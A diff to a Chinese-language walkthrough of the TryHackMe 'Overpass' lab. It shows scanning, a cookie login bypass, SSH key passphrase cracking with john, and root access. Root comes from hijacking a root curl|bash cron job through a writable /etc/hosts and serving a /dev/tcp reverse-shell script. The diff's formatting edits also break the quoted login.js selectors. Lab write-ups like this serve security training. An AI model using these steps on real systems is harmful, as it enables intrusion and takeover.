@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~]
-└─# nmap -sV -Pn 10.10.74.226                         
+└─#  nmap -sV -Pn 10.10.74.226                         
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 02:33 EDT
 Nmap scan report for 10.10.74.226
@@ -16,10 +16,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
 ```
 
-#web目录爆破
+# web目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py  -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u  http://10.10.74.226 
+└─#  python3 dirsearch.py  -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u  http://10.10.74.226 
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -39,14 +39,14 @@ Target: http://10.10.74.226
 [02:36:56] 301 -    0B  - /css  ->  css/    
 ```
 
-#web站点分析
+# web站点分析
 
 首页是一个密码软件的介绍页面
 首页源代码有一行注释:``` Yeah right, just because the Romans used it doesn't make it military grade, change this?```
 
 
 /download页面可以下载到网站的源码（一个go文件，文件名：overpass.go），部署脚本（一个sh文件，文件名：buildscript.sh）
-#源代码分析
+# 源代码分析
 ```overpass.go```分析
 总共5个分支：
 1，Retrieve Password For Service
@@ -60,11 +60,11 @@ Target: http://10.10.74.226
 下载一个可执行程序，尝试保存ssh的密码123456，发现本目录果然生成了一个密文文件,加密算法是rot47
 ```
 ┌──(root💀kali)-[~]
-└─# pwd             
+└─#  pwd             
 /root
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~]
-└─# cat .overpass 
+└─#  cat .overpass 
 ,LQ?2>6QiQDD9Q[QA2DDQiQ`abcdeQN. 
 ```
 
@@ -86,9 +86,9 @@ MuirlandOracle
 /admin是一个登陆界面,查看网页源代码，其中login.js里有一段
 ```
 async function login() {
-    const usernameBox = document.querySelector("#username");
-    const passwordBox = document.querySelector("#password");
-    const loginStatus = document.querySelector("#loginStatus");
+    const usernameBox = document.querySelector("# username");
+    const passwordBox = document.querySelector("# password");
+    const loginStatus = document.querySelector("# loginStatus");
     loginStatus.textContent = ""
     const creds = { username: usernameBox.value, password: passwordBox.value }
     const response = await postData("/api/login", creds)
@@ -107,7 +107,7 @@ async function login() {
 
 我们在/admin下，按f12，在console里面输入```Cookies.set("SessionToken","")```就可以绕过登录，直接跳转到/admin登录后页面
 
-#打开http://10.10.74.226/admin/，显示
+# 打开http://10.10.74.226/admin/，显示
 ```
 Welcome to the Overpass Administrator area
 A secure password manager with support for Windows, Linux, MacOS and more
@@ -155,14 +155,14 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 使用ssh2john把私钥保存成hash.txt，然后用john破解，成功破解出私钥密码：```james13```
 ```
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# /usr/share/john/ssh2john.py id_rsa >hash.txt                                                                                                                                                                                      127 ⨯
+└─#  /usr/share/john/ssh2john.py id_rsa >hash.txt                                                                                                                                                                                      127 ⨯
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# cat hash.txt    
+└─#  cat hash.txt    
 id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# john hash.txt                                                        
+└─#  john hash.txt                                                        
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -182,10 +182,10 @@ Proceeding with incremental:ASCII
 james13          (id_rsa)
 ```
 
-#登录james的账号，拿到user.txt
+# 登录james的账号，拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# ssh james@10.10.74.226 -i id_rsa 
+└─#  ssh james@10.10.74.226 -i id_rsa 
 Enter passphrase for key 'id_rsa': 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
 
@@ -214,7 +214,7 @@ james@overpass-prod:~$
 
 ```
 
-#查看另一个todo文件
+# 查看另一个todo文件
 ```
 james@overpass-prod:~$ cat todo.txt 
 To Do:
@@ -227,10 +227,10 @@ To Do:
 
 ```
 
-#传linpea，枚举提权信息,有一个cron任务是用root执行的,每分钟执行一次
+# 传linpea，枚举提权信息,有一个cron任务是用root执行的,每分钟执行一次
 ```* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash```
 
-#分析
+# 分析
 这个定时任务是通过curl的http访问overpass.thm站点下的/downloads/src/buildscript.sh文件，访问成功以后通过管道符把上一个命令的执行的结果传送到```bash```命令
 
 
@@ -247,7 +247,7 @@ cat /home/james/.overpass
 
 把.overpass传回攻击机根目录，执行overpassLinux
 ```
-└─# ./overpassLinux
+└─#  ./overpassLinux
 Welcome to Overpass
 Options:
 1       Retrieve Password For Service
@@ -262,19 +262,19 @@ System   saydrawnlyingpicture
 
 得到```System   saydrawnlyingpicture```经验证这个是james的ssh密码,不过好像没啥卵用。。。
 
-#查看/etc/hosts权限，发现是可写的
+# 查看/etc/hosts权限，发现是可写的
 ```
 james@overpass-prod:~$ ll /etc/hosts
 -rw-rw-rw- 1 root root 253 Sep 22 10:20 /etc/hosts
 ```
 
-#查看/etc/hosts文件
+# 查看/etc/hosts文件
 ```
 james@overpass-prod:/home$ cat /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
 127.0.0.1 overpass.thm
-# The following lines are desirable for IPv6 capable hosts
+#  The following lines are desirable for IPv6 capable hosts
 ::1     ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
@@ -283,13 +283,13 @@ ff02::2 ip6-allrouters
 ```
 由上可知overpass.thm这个域名是绑定在127.0.0.1下的，假如我们可以把这个域名指向到一个我们可以编辑的文件夹，那么就可以利用上面的cron提权
 
-#编辑
+# 编辑
 把127.0.0.1 overpass.thm 变成 10.13.21.169 overpass.thm，指向我们的攻击机
 ```
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
 10.13.21.169 overpass.thm
-# The following lines are desirable for IPv6 capable hosts
+#  The following lines are desirable for IPv6 capable hosts
 ::1     ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
@@ -298,37 +298,37 @@ ff02::2 ip6-allrouters
 ```
 
 
-#在攻击机执行
+# 在攻击机执行
 ```
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# mkdir -p downloads/src/
+└─#  mkdir -p downloads/src/
                                                                                                                                                                                                                                  
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# echo "bash -i >& /dev/tcp/10.13.21.169/4444 0>&1" > ./downloads/src/buildscript.sh                                                                                                                                                  1 ⨯
+└─#  echo "bash -i >& /dev/tcp/10.13.21.169/4444 0>&1" > ./downloads/src/buildscript.sh                                                                                                                                                  1 ⨯
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# chmod +x ./downloads/src/buildscript.sh 
+└─#  chmod +x ./downloads/src/buildscript.sh 
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# python3 -m http.server 80
+└─#  python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.74.226 - - [22/Sep/2021 06:23:45] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
 ```
 
-#在攻击机另起一个shell，开始监听,拿到root shell
+# 在攻击机另起一个shell，开始监听,拿到root shell
 
 ```
 ┌──(root💀kali)-[~/tryhackme/overpass]
-└─# nc -lnvp 4444
+└─#  nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.74.226] 46586
 bash: cannot set terminal process group (2376): Inappropriate ioctl for device
 bash: no job control in this shell
-root@overpass-prod:~# id
+root@overpass-prod:~#  id
 id
 uid=0(root) gid=0(root) groups=0(root)
-root@overpass-prod:~# cat /root/root.txt        
+root@overpass-prod:~#  cat /root/root.txt        
 cat /root/root.txt
 thm{7f336f8c359dbac18d54fdd64ea753bb}
-root@overpass-prod:~# 
+root@overpass-prod:~#  
 ```
